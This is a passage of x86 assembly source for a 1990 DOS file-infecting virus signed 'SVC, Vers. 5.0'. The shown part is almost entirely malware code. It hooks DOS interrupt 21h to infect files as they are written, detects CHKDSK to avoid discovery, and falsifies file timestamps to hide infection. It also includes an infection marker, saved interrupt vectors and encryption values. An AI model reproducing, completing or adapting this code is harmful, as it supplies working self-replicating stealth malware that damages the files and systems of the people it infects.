                mov     cs:handletoinfect,bx
                mov     cs:filehand,0
handlewrite_done:
                mov     dx,cs:curposlo          ; return to original
                mov     cx,cs:curposhi          ; position
                mov     ax,4200h
                call    callint21
handlewrite_exit:
                jmp     exitint21

terminate:
                mov     cs:chkdskflag,0
                jmp     exitint21

check_chkdsk:
                mov     si,dx
                cld
check_chkdsk_loop1:
                lodsw
                cmp     ah,0
                je      check_chkdsk_exit
                cmp     ax,'HC'
                je      check_chkdsk_loop2
                cmp     ax,'hc'
                je      check_chkdsk_loop2
                dec     si
                jmp     short check_chkdsk_loop1
check_chkdsk_exit:
                retn
check_chkdsk_loop2:
                push    si
                lodsw
                cmp     ax,'DK'
                pop     si
                jz      check_chkdsk_found
                cmp     ax,'dk'
                je      check_chkdsk_found
                dec     si
                jmp     short check_chkdsk_loop1
check_chkdsk_found:
                mov     cs:chkdskflag,1
                retn

getsetfiletime:
                cmp     al,0                    ; get file tiem?
                jne     getsetfiletime_exit     ; nope, exit
                call    dword ptr cs:oldint21   ; prechain
                pushf
                and     cx,1Eh                  ; if (seconds == 60)
                cmp     cx,1Eh                  ; then xor with 60h
                jne     getsetfiletime_nofix    ; to hide the change
                xor     cx,1Eh                  ; otherwise, don't
getsetfiletime_nofix:
                jmp     exit_replaceflags
getsetfiletime_exit:
                popf
                jmp     dword ptr cs:oldint21

                db      '(c) 1990 by SVC,Vers. '



infection_marker db      '5.0 ',0

begindata:
oldint1         dw      0, 0
oldint3         dw      0, 0
oldint8         dw      0, 0
oldint21        dw      0, 0
savebuffer      dw      20CDh
                dw      11 dup (0)
tickcount       db      0
carrierPSP      dw      0
origposlo       dw      0
origposhi       dw      0
carrierEOFlo    dw      0
carrierEOFhi    dw      0
bytesread       dw      0
bufferoff       dw      0
bufferseg       dw      0
tempstoreCX     dw      0
tempstoreDX     dw      0
filehand        dw      0
fileattr        dw      0
filetime        dw      0
filedate        dw      0
chkdskflag      dw      0
oldint24        dw      0, 0
oldint23        dw      0, 0
handletoinfect  dw      0
storesIP        dw      0
storesCS        dw      0
returnFlags     dw      0
filesizelo      dw      0
filesizehi      dw      0
curposlo        dw      0
curposhi        dw      0
workbuffer      dw      12 dup (0)
storeAX         dw      0
                db      0
storess         dw      0
storesp         dw      0
int21command    dw      0
encryptval1     db      0
encryptval2     db      0
                dw      1990h ; written 1990
versionbyte     db      50h   ; version 5.0

endvirus        =       $
viruslength     =       $ - start
                end     start
